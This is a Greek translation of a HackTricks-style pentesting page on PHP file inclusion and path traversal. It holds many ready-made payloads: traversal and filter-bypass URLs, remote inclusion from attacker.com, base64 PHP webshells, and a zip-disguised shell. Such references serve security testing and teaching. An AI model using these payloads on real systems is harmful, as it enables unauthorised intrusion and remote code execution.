# Συμπερίληψη Αρχείου/Διάβαση Διαδρομής

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**Διακομιστή Discord του HackenProof**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνείτε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγές Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξετάζει την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορο κόσμο του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες εκκινήσεις ευρημάτων ευπάθειας και κρίσιμες ενημερώσεις πλατφόρμας

**Ελάτε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε τη συνεργασία με κορυφαίους χάκερ σήμερα!

## Συμπερίληψη Αρχείου

**Απομακρυσμένη Συμπερίληψη Αρχείου (RFI):** Το αρχείο φορτώνεται από έναν απομακρυσμένο διακομιστή (Καλύτερα: Μπορείτε να γράψετε τον κώδικα και ο διακομιστής θα τον εκτελέσει). Στην php αυτό είναι **απενεργοποιημένο** από προεπιλογή (**allow\_url\_include**).\
**Τοπική Συμπερίληψη Αρχείου (LFI):** Ο διακομιστής φορτώνει ένα τοπικό αρχείο.

Η ευπάθεια προκύπτει όταν ο χρήστης μπορεί να ελέγχει με κάποιον τρόπο το αρχείο που θα φορτωθεί από τον διακομιστή.

Ευπάθειες **συναρτήσεις PHP**: require, require\_once, include, include\_once

Ένα ενδιαφέρον εργαλείο για την εκμετάλλευση αυτής της ευπάθειας: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Τυφλή - Ενδιαφέρουσα - Αρχεία LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Ανακατεύοντας αρκετές λίστες LFI του \*nix και προσθέτοντας περισσότερα μονοπάτια, έχω δημιουργήσει αυτή:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Δοκιμάστε επίσης να αλλάξετε το `/` σε `\`\
Δοκιμάστε επίσης να προσθέσετε `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /etc/password (για να ελέγξει αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [εδώ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Συγχώνευση διαφορετικών λιστών:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Δοκιμάστε επίσης να αλλάξετε το `/` σε `\`\
Δοκιμάστε επίσης να αφαιρέσετε `C:/` και να προσθέσετε `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /boot.ini (για να ελέγξει αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [εδώ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Ελέγξτε τη λίστα LFI του Linux.

## Βασική LFI και παράκαμψη

Όλα τα παραδείγματα είναι για Τοπική Ενσωμάτωση Αρχείου αλλά μπορούν να εφαρμοστούν και στην Απομακρυσμένη Ενσωμάτωση Αρχείου επίσης (σελίδα=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### ακολουθίες διάβασης αφαιρεμένες μη αναδρομικά
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Μηδενικό byte (%00)**

Ανακάλυψη της προσθήκης περισσότερων χαρακτήρων στο τέλος του παρεχόμενου string (αναίρεση του: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Αυτό έχει **λυθεί από την PHP 5.4**

### **Κωδικοποίηση**

Μπορείτε να χρησιμοποιήσετε μη τυπικές κωδικοποιήσεις όπως διπλό URL κωδικοποίηση (και άλλες):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Από υπάρχουσα φάκελο

Ίσως το back-end ελέγχει τη διαδρομή του φακέλου:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Εξερεύνηση των Καταλόγων του Συστήματος Αρχείων σε Ένα Διακομιστή

Ο σύστημα αρχείων ενός διακομιστή μπορεί να εξερευνηθεί αναδρομικά για την αναγνώριση καταλόγων, όχι μόνο αρχείων, χρησιμοποιώντας συγκεκριμένες τεχνικές. Αυτή η διαδικασία περιλαμβάνει τον προσδιορισμό του βάθους του καταλόγου και τον έλεγχο για την ύπαρξη συγκεκριμένων φακέλων. Παρακάτω παρουσιάζεται μια λεπτομερής μέθοδος για την επίτευξη αυτού:

1. **Καθορισμός Βάθους Καταλόγου:** Καθορίστε το βάθος του τρέχοντος καταλόγου σας επιτυχώς ανακτώντας το αρχείο `/etc/passwd` (ισχύει εάν ο διακομιστής είναι βασισμένος σε Linux). Ένα παράδειγμα URL μπορεί να έχει την ακόλουθη δομή, υποδεικνύοντας ένα βάθος τριών:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Έρευνα Φακέλων:** Προσθέστε το όνομα του υποψιαζόμενου φακέλου (π.χ., `private`) στο URL, στη συνέχεια πλοηγηθείτε πίσω στο `/etc/passwd`. Το επιπλέον επίπεδο καταλόγου απαιτεί αύξηση του βάθους κατά ένα:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ερμηνεία των Αποτελεσμάτων:** Η απάντηση του διακομιστή υποδηλώνει εάν ο φάκελος υπάρχει:
   * **Σφάλμα / Χωρίς Έξοδο:** Ο φάκελος `private` πιθανότατα δεν υπάρχει στην καθορισμένη τοποθεσία.
   * **Περιεχόμενα του `/etc/passwd`:** Η ύπαρξη του φακέλου `private` επιβεβαιώνεται.
4. **Αναδρομική Εξερεύνηση:** Οι ανακαλυφθέντες φάκελοι μπορούν να εξεταστούν περαιτέρω για υποφακέλους ή αρχεία χρησιμοποιώντας την ίδια τεχνική ή τις παραδοσιακές μεθόδους Ενσωμάτωσης Τοπικού Αρχείου (LFI).

Για την εξερεύνηση καταλόγων σε διαφορετικές τοποθεσίες στο σύστημα αρχείων, προσαρμόστε το φορτίο αναλόγως. Για παράδειγμα, για να ελέγξετε εάν ο φάκελος `/var/www/` περιέχει έναν φάκελο `private` (υποθέτοντας ότι ο τρέχων φάκελος βρίσκεται σε βάθος 3), χρησιμοποιήστε:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Τεχνική Ενίσχυσης Διαδρομής**

Η ενίσχυση διαδρομής είναι μια μέθοδος που χρησιμοποιείται για την παραπλάνηση των διαδρομών αρχείων σε web εφαρμογές. Συχνά χρησιμοποιείται για την πρόσβαση σε περιορισμένα αρχεία παρακάμπτοντας συγκεκριμένα μέτρα ασφαλείας που προσθέτουν επιπλέον χαρακτήρες στο τέλος των διαδρομών αρχείων. Ο στόχος είναι να δημιουργηθεί μια διαδρομή αρχείου που, αφού τροποποιηθεί από το μέτρο ασφαλείας, να εξακολουθεί να δείχνει στο επιθυμητό αρχείο.

Στην PHP, διάφορες αναπαραστάσεις μιας διαδρομής αρχείου μπορούν να θεωρηθούν ισοδύναμες λόγω της φύσης του συστήματος αρχείων. Για παράδειγμα:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, και `/etc/passwd/` θεωρούνται όλα η ίδια διαδρομή.
* Όταν οι τελευταίοι 6 χαρακτήρες είναι `passwd`, η προσθήκη ενός `/` (κάνοντάς το `passwd/`) δεν αλλάζει το στοχευμένο αρχείο.
* Επίσης, αν προστεθεί το `.php` σε μια διαδρομή αρχείου (όπως `shellcode.php`), η προσθήκη ενός `/.` στο τέλος δεν θα αλλάξει το αρχείο που προσπελαύνεται.

Τα παραδείγματα που παρέχονται επιδεικνύουν πώς να χρησιμοποιήσετε την ενίσχυση διαδρομής για να έχετε πρόσβαση στο `/etc/passwd`, ένα συνηθισμένο στόχο λόγω του ευαίσθητου περιεχομένου του (πληροφορίες λογαριασμών χρηστών):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Σε αυτά τα σενάρια, ο αριθμός των διασχίσεων που απαιτούνται μπορεί να είναι περίπου 2027, αλλά αυτός ο αριθμός μπορεί να ποικίλει ανάλογα με τη διαμόρφωση του διακομιστή.

* **Χρήση τμημάτων με τελείες και επιπλέον χαρακτήρες**: Ακολουθίες διέλευσης (`../`) σε συνδυασμό με επιπλέον τμήματα τελείας και χαρακτήρες μπορούν να χρησιμοποιηθούν για την πλοήγηση στο σύστημα αρχείων, αγνοώντας αποτελεσματικά τις προσαρτημένες συμβολοσειρές από τον διακομιστή.
* **Καθορισμός του απαιτούμενου αριθμού διασχίσεων**: Μέσω δοκιμής και σφάλματος, μπορεί κανείς να βρει τον ακριβή αριθμό των ακολουθιών `../` που απαιτούνται για να πλοηγηθεί στον ριζικό κατάλογο και στη συνέχεια στο `/etc/passwd`, εξασφαλίζοντας ότι οποιεσδήποτε προσαρτημένες συμβολοσειρές (όπως `.php`) αναιρούνται αλλά η επιθυμητή διαδρομή (`/etc/passwd`) παραμένει ανέπαφη.
* **Έναρξη με ένα ψεύτικο κατάλογο**: Είναι συνηθισμένη πρακτική να ξεκινά η διαδρομή με ένα μη υπαρκτό κατάλογο (όπως `a/`). Αυτή η τεχνική χρησιμοποιείται ως προληπτικό μέτρο ή για να εκπληρωθούν οι απαιτήσεις της λογικής ανάλυσης διαδρομής του διακομιστή.

Κατά τη χρήση τεχνικών διακοπής διαδρομής, είναι κρίσιμο να κατανοήσετε τη συμπεριφορά ανάλυσης διαδρομής του διακομιστή και τη δομή του συστήματος αρχείων. Κάθε σενάριο μπορεί να απαιτεί μια διαφορετική προσέγγιση, και συχνά είναι απαραίτητο το τεστ για την εύρεση της πιο αποτελεσματικής μεθόδου.

**Αυτή η ευπάθεια διορθώθηκε στο PHP 5.3.**

### **Κόλπα παράκαμψης φίλτρων**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Απομακρυσμένη Συμπερίληψη Αρχείου

Στην php αυτό είναι απενεργοποιημένο από προεπιλογή επειδή το **`allow_url_include`** είναι **Off.** Πρέπει να είναι **On** για να λειτουργήσει, και σε αυτήν την περίπτωση θα μπορούσατε να συμπεριλάβετε ένα αρχείο PHP από τον διακομιστή σας και να λάβετε RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Εάν για κάποιο λόγο το **`allow_url_include`** είναι **On**, αλλά το PHP φιλτράρει την πρόσβαση σε εξωτερικές ιστοσελίδες, [σύμφωνα με αυτή την ανάρτηση](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), θα μπορούσατε να χρησιμοποιήσετε για παράδειγμα το πρωτόκολλο data με το base64 για να αποκωδικοποιήσετε έναν κώδικα PHP b64 και να λάβετε RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Στον προηγούμενο κώδικα, το τελικό `+.txt` προστέθηκε επειδή ο επιτιθέμενος χρειαζόταν ένα string που να τελειώνει σε `.txt`, έτσι το string τελειώνει με αυτό και μετά την αποκωδικοποίηση b64 αυτό το τμήμα θα επιστρέψει απλώς ανούσια δεδομένα και το πραγματικό κώδικα PHP θα συμπεριληφθεί (και συνεπώς, θα εκτελεστεί).
{% endhint %}

Ένα άλλο παράδειγμα **χωρίς τη χρήση του πρωτοκόλλου `php://`** θα ήταν:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Ρίζα στοιχείου σε Python

Στην Python σε έναν κώδικα όπως αυτόν:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Εάν ο χρήστης περάσει ένα **απόλυτο μονοπάτι** στο **`file_name`**, το **προηγούμενο μονοπάτι απλώς αφαιρείται**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Αυτή είναι η επιθυμητή συμπεριφορά σύμφωνα με [τα έγγραφα](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Εάν ένα στοιχείο είναι απόλυτη διαδρομή, όλα τα προηγούμενα στοιχεία απορρίπτονται και η συνένωση συνεχίζεται από το απόλυτο στοιχείο της διαδρομής.

## Κατάλογοι λίστας Java

Φαίνεται ότι εάν έχετε ένα Path Traversal σε Java και **ζητήσετε έναν κατάλογο** αντί για ένα αρχείο, **επιστρέφεται μια λίστα του καταλόγου**. Αυτό δεν θα συμβεί σε άλλες γλώσσες (από όσο γνωρίζω).

## Κορυφαίες 25 παράμετροι

Εδώ είναι η λίστα των 25 κορυφαίων παραμέτρων που θα μπορούσαν να είναι ευάλωτες σε τοπικές ενσωματώσεις αρχείων (LFI) (από το [σύνδεσμο](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI χρησιμοποιώντας PHP wrappers & πρωτόκολλα

### php://filter

Τα PHP φίλτρα επιτρέπουν βασικές λειτουργίες **τροποποίησης των δεδομένων** πριν αυτά διαβαστούν ή γραφτούν. Υπάρχουν 5 κατηγορίες φίλτρων:

* [Φίλτρα Συμβολοσειράς](https://www.php.net/manual/en/filters.string.php):
  * `string.rot13`
  * `string.toupper`
  * `string.tolower`
  * `string.strip_tags`: Αφαιρεί τις ετικέτες από τα δεδομένα (όλα μεταξύ των χαρακτήρων "<" και ">")
  * Σημειώστε ότι αυτό το φίλτρο έχει εξαφανιστεί από τις σύγχρονες εκδόσεις του PHP
* [Φίλτρα Μετατροπής](https://www.php.net/manual/en/filters.convert.php)
  * `convert.base64-encode`
  * `convert.base64-decode`
  * `convert.quoted-printable-encode`
  * `convert.quoted-printable-decode`
  * `convert.iconv.*` : Μετατρέπει σε διαφορετική κωδικοποίηση (`convert.iconv.<input_enc>.<output_enc>`). Για να λάβετε τη **λίστα όλων των υποστηριζόμενων κωδικοποιήσεων** εκτελέστε στη γραμμή εντολών: `iconv -l`

{% hint style="warning" %}
Εκμεταλλευόμενοι το φίλτρο μετατροπής `convert.iconv.*` μπορείτε να **δημιουργήσετε αυθαίρετο κείμενο**, το οποίο θα μπορούσε να είναι χρήσιμο για την εγγραφή αυθαίρετου κειμένου ή για τη δημιουργία μιας λειτουργίας όπως η συμπερίληψη αυθαίρετου κειμένου. Για περισσότερες πληροφορίες ελέγξτε το [**LFI2RCE μέσω php φίλτρων**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Φίλτρα Συμπίεσης](https://www.php.net/manual/en/filters.compression.php)
  * `zlib.deflate`: Συμπιέζει το περιεχόμενο (χρήσιμο αν εξαγάγετε πολλές πληροφορίες)
  * `zlib.inflate`: Αποσυμπιέζει τα δεδομένα
* [Φίλτρα Κρυπτογράφησης](https://www.php.net/manual/en/filters.encryption.php)
  * `mcrypt.*` : Αποσυρμένο
  * `mdecrypt.*` : Αποσυρμένο
* Άλλα Φίλτρα
  * Εκτελώντας στο php `var_dump(stream_get_filters());` μπορείτε να βρείτε μερικά **απροσδόκητα φίλτρα**:
    * `consumed`
    * `dechunk`: αντιστρέφει την κωδικοποίηση HTTP chunked
    * `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
Το μέρος "php://filter" είναι μη ευαίσθητο στην περίπτωση
{% endhint %}

### Χρησιμοποιώντας τα php φίλτρα ως oracle για την ανάγνωση αυθαίρετων αρχείων

[**Σε αυτήν την ανάρτηση**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) προτείνεται μια τεχνική για την ανάγνωση ενός τοπικού αρχείου χωρίς να έχουμε την έξοδο που επιστρέφεται από τον διακομιστή. Αυτή η τεχνική βασίζεται σε μια **δυαδική εξυφάνωση του αρχείου (χαρακτήρα προς χαρακτήρα) χρησιμοποιώντας τα php φίλτρα** ως oracle. Αυτό συμβαίνει επειδή τα php φίλτρα μπορούν να χρησιμοποιηθούν για να κάνουν ένα κείμενο αρκετά μεγάλο ώστε να προκαλέσουν μια εξαίρεση στο php.

Στην αρχική ανάρτηση μπορείτε να βρείτε μια λεπτομερή εξήγηση της τεχνικής, αλλά εδώ υπάρχει ένα γρήγορο σύνοψη:

* Χρησιμοποιήστε τον κωδικοποιητή **`UCS-4LE`** για να αφήσετε τον πρώτο χαρακτήρα του κειμένου στην αρχή και να αυξήσετε εκθετικά το μέγεθος της συμβολοσειράς.
* Αυτό θα χρησιμοποιηθεί για να δημιουργήσει ένα **τόσο μεγάλο κείμενο όταν μαντευτεί σωστά το αρχικό γράμμα** ώστε το php να προκαλέσει ένα **σφάλμα**
* Το φίλτρο **dechunk** θα **αφαιρέσει τα πάντα αν ο πρώτος χαρακτήρας δεν είναι εξαδεκαδικός**, έτσι μπορούμε να γνωρίζουμε αν ο πρώτος χαρακτήρας είναι εξαδεκαδικός.
* Αυτό, σε συνδυασμό με το προηγούμενο (και άλλα φίλτρα ανάλογα με το μαντεμένο γράμμα), θα μας επιτρέψει να μαντέψουμε ένα γράμμα στην αρχή του κειμένου βλέποντας πότε κάνουμε αρκετές μετασχηματίσεις ώστε να μην είναι πλέον εξαδεκαδικός χαρακτήρας. Επειδή αν είναι εξαδεκαδικός, το dechunk δεν θα το διαγράψει και το αρχικό "βόμβα" θα προκαλέσει σφάλμα στο php.
* Ο κωδικοποιητής **convert.iconv.UNICODE.CP930** μετατρέπει κάθε γράμμα στο επόμενο (έτσι μετά από αυτόν τον κωδικοποιητή: α -> β). Αυτό μας επιτρέπει να ανακαλύψουμε αν το πρώτο γράμμα είναι ένα `α` για παράδειγμα, επειδή αν εφαρμόσουμε 6 φορές αυτόν τον κωδικοποιητή α->β->γ->δ->ε->ζ το γράμμα δεν είναι πλέον εξαδεκαδικός χαρακτήρας, συνεπώς το dechunk δεν το διαγράφει και το σφάλμα του php προκαλείται επειδή πολλαπλασιάζεται με την αρχική "βόμβα".
* Χρησιμοποιώντας άλλες μετασχηματίσεις όπως το **rot13** στην αρχή είναι δυνατό να διαρρεύσουν άλλοι χαρακτήρες όπως το n, o, p, q, r (και άλλοι κωδικοποιητές μπορούν να χρησιμοποιηθούν για να μετακινήσουν άλλα γράμματα στο εύρος των εξαδεκαδικών).
* Όταν το αρχικό γράμμα είναι ένας αριθμός, είναι απαραίτητο να τον κωδικοποιήσουμε σε base64 και να διαρρεύσουμε τα 2 πρώτα γράμματα για να διαρρεύσουμε τον αριθμό.
* Το τελικό πρόβλημα είναι να δούμε **πώς να διαρρεύσουμε περισσότερο από το αρχικό γράμμα**. Χρησιμοποιώντας φίλτρα μνήμης τάξης όπως το **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** είναι δυνατό να αλλάξετε τη σειρά των χαρακτήρων και να πάρετε στην πρώτη θέση άλλα γράμματα του κειμένου.
* Και προκειμένου να είναι δυνατή η απόκτηση **περισσότερων δεδομένων**, η ιδέα είναι να **δημιουργήσετε 2 bytes αχρήστων δεδομένων στην αρχή** με το **convert.iconv.UTF16.UTF16**, να εφαρμόσετε το **UCS-4LE** για να το κάνετε **περιστροφή με τα επόμενα 2 bytes**, και να **διαγράψετε τα δεδομένα μέχρι τα αχρήστα δεδομένα** (αυτό θα αφαιρέσει τα πρώτα 2 bytes του αρχικού κειμένου). Συνεχίστε να κάνετε αυτό μέχρι να φτάσετε στο επιθυμητό bit για διαρροή.

Στην ανάρτηση διέρρευσε επίσης ένα εργαλείο για να εκτελέσετε αυτό αυτόματα: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Αυτό το περιτύλιγμα επιτρέπει την πρόσβαση σε αριθμούς αρχείων που έχει ανοιχτό η διεργασία. Πιθανώς χρήσιμο για τη διαρροή του περιεχομένου ανοιχτών αρχείων:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Μπορείτε επίσης να χρησιμοποιήσετε τα **php://stdin, php://stdout και php://stderr** για πρόσβαση στα **αρχεία περιγραφέων 0, 1 και 2** αντίστοιχα (δεν είναι σίγουρο πώς αυτό θα μπορούσε να είναι χρήσιμο σε μια επίθεση)

### zip:// και rar://

Μεταφορτώστε ένα αρχείο Zip ή Rar με ένα PHPShell μέσα και αποκτήστε πρόσβαση σε αυτό.\
Για να είναι δυνατή η κατάχρηση του πρωτοκόλλου rar **χρειάζεται να ενεργοποιηθεί ειδικά**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Το `data://` σας επιτρέπει να εισάγετε δεδομένα απευθείας στο URL, αντί να ανακατευθύνετε σε έναν εξωτερικό πόρο.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Σημείωση ότι αυτό το πρωτόκολλο περιορίζεται από τις ρυθμίσεις του php **`allow_url_open`** και **`allow_url_include`**

### expect://

Το expect πρέπει να ενεργοποιηθεί. Μπορείτε να εκτελέσετε κώδικα χρησιμοποιώντας αυτό:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Καθορίστε το φορτίο σας στις παραμέτρους POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Ένα αρχείο `.phar` μπορεί να χρησιμοποιηθεί για την εκτέλεση κώδικα PHP όταν μια web εφαρμογή χρησιμοποιεί λειτουργίες όπως το `include` για τη φόρτωση αρχείων. Το απόσπασμα κώδικα PHP που παρέχεται παρακάτω δείχνει τη δημιουργία ενός αρχείου `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Για να συντάξετε το αρχείο `.phar`, πρέπει να εκτελέσετε την παρακάτω εντολή:
```bash
php --define phar.readonly=0 create_path.php
```
Κατά την εκτέλεση, θα δημιουργηθεί ένα αρχείο με το όνομα `test.phar`, το οποίο θα μπορούσε ενδεχομένως να χρησιμοποιηθεί για εκμετάλλευση ευπαθειών Τοπικής Συμπερίληψης Αρχείων (LFI).

Σε περιπτώσεις όπου το LFI εκτελεί μόνο ανάγνωση αρχείων χωρίς εκτέλεση του κώδικα PHP μέσα σε αυτά, μέσω συναρτήσεων όπως `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ή `filesize()`, θα μπορούσε να προσπαθηθεί η εκμετάλλευση μιας ευπαθότητας αποσειριοποίησης. Αυτή η ευπαθότητα σχετίζεται με την ανάγνωση αρχείων χρησιμοποιώντας το πρωτόκολλο `phar`.

Για μια λεπτομερή κατανόηση της εκμετάλλευσης ευπαθειών αποσειριοποίησης στο πλαίσιο αρχείων `.phar`, ανατρέξτε στο έγγραφο που συνδέεται παρακάτω:

[Οδηγός Εκμετάλλευσης Αποσειριοποίησης Phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

Ήταν δυνατό να καταχραστείτε **οποιοδήποτε αυθαίρετο αρχείο που διαβάζεται από το PHP και υποστηρίζει φίλτρα php** για να πάρετε ένα RCE. Η λεπτομερής περιγραφή μπορεί να βρεθεί [**σε αυτή την ανάρτηση**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Πολύ σύντομη περίληψη: ένα **3 byte υπερχείλιση** στη στοίβα του PHP καταχράστηκε για να **τροποποιήσει τη σειρά των ελεύθερων τμημάτων** συγκεκριμένου μεγέθους ώστε να μπορεί να **γράψει οτιδήποτε σε οποιαδήποτε διεύθυνση**, έτσι προστέθηκε ένας σύνδεσμος για να καλεί την **`system`**.\
Ήταν δυνατό να δεσμεύονται τμήματα συγκεκριμένων μεγεθών καταχρηστικά χρησιμοποιώντας περισσότερα φίλτρα php.

### Περισσότερα πρωτόκολλα

Ελέγξτε περισσότερα πιθανά [**πρωτόκολλα που μπορούν να συμπεριληφθούν εδώ**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory και php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Εγγραφή στη μνήμη ή σε ένα προσωρινό αρχείο (δεν είναι σίγουρο πώς μπορεί να είναι χρήσιμο σε μια επίθεση συμπερίληψης αρχείων)
